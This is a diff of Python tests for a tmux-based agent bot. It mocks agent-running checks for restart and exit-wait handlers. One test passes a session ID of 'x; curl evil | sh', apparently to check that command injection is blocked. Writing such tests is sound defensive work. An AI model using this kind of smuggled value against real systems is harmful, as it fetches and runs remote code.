@@ -105,6 +105,7 @@ class TestRestartBusyGuard:
                 session_id="11111111-2222-3333-4444-555555555555", runtime="claude"
             )
             tm.find_window_by_id = AsyncMock(return_value=MagicMock(window_name="proj"))
+            tm.is_agent_running = AsyncMock(return_value=False)
             tm.capture_pane = AsyncMock(return_value="❯ ")
             tm.send_keys = AsyncMock()
             # _wait_pane_ready polls session_manager.capture_pane until the
@@ -149,6 +150,7 @@ class TestRestartBusyGuard:
                 session_id="x; curl evil | sh", runtime="claude"
             )
             tm.find_window_by_id = AsyncMock(return_value=MagicMock(window_name="proj"))
+            tm.is_agent_running = AsyncMock(return_value=False)
             tm.capture_pane = AsyncMock(return_value="❯ ")
             tm.send_keys = AsyncMock()
             sm.capture_pane = AsyncMock(return_value="❯ \n" + "─" * 100 + "\n")
@@ -188,6 +190,7 @@ class TestRestartBusyGuard:
             tm.find_window_by_id = AsyncMock(
                 return_value=MagicMock(window_name="myproject")
             )
+            tm.is_agent_running = AsyncMock(return_value=False)
             tm.capture_pane = AsyncMock(return_value="› ")
             tm.send_keys = AsyncMock()
             sm.capture_pane = AsyncMock(return_value="› \n" + "─" * 100 + "\n")
@@ -230,6 +233,7 @@ class TestRestartBusyGuard:
                 session_id="11111111-2222-3333-4444-555555555555", runtime="claude"
             )
             tm.find_window_by_id = AsyncMock(return_value=MagicMock(window_name="proj"))
+            tm.is_agent_running = AsyncMock(return_value=False)
             tm.capture_pane = AsyncMock(return_value="❯ ")
             tm.send_keys = AsyncMock()
 
@@ -251,18 +255,15 @@ class TestWaitAgentExited:
     @pytest.mark.asyncio
     async def test_true_when_pane_back_to_shell(self):
         from ccbot.handlers.callbacks import _wait_agent_exited
-        from ccbot.runtimes import CLAUDE
 
         with patch("ccbot.handlers.callbacks.tmux_manager") as tm:
-            tm.find_window_by_id = AsyncMock(
-                return_value=MagicMock(pane_current_command="bash")
-            )
-            assert await _wait_agent_exited("@5", CLAUDE, timeout=1.0) is True
+            tm.find_window_by_id = AsyncMock(return_value=MagicMock())
+            tm.is_agent_running = AsyncMock(return_value=False)
+            assert await _wait_agent_exited("@5", timeout=1.0) is True
 
     @pytest.mark.asyncio
     async def test_false_when_still_the_agent(self, monkeypatch):
         from ccbot.handlers.callbacks import _wait_agent_exited
-        from ccbot.runtimes import CLAUDE
 
         clock = {"t": 0.0}
         monkeypatch.setattr(
@@ -276,10 +277,9 @@ class TestWaitAgentExited:
             patch("ccbot.handlers.callbacks.tmux_manager") as tm,
             patch("ccbot.handlers.callbacks.asyncio.sleep", new=_tick),
         ):
-            tm.find_window_by_id = AsyncMock(
-                return_value=MagicMock(pane_current_command="claude")
-            )
-            assert await _wait_agent_exited("@5", CLAUDE, timeout=1.0) is False
+            tm.find_window_by_id = AsyncMock(return_value=MagicMock())
+            tm.is_agent_running = AsyncMock(return_value=True)
+            assert await _wait_agent_exited("@5", timeout=1.0) is False
 
 
 class TestGuardedWid:
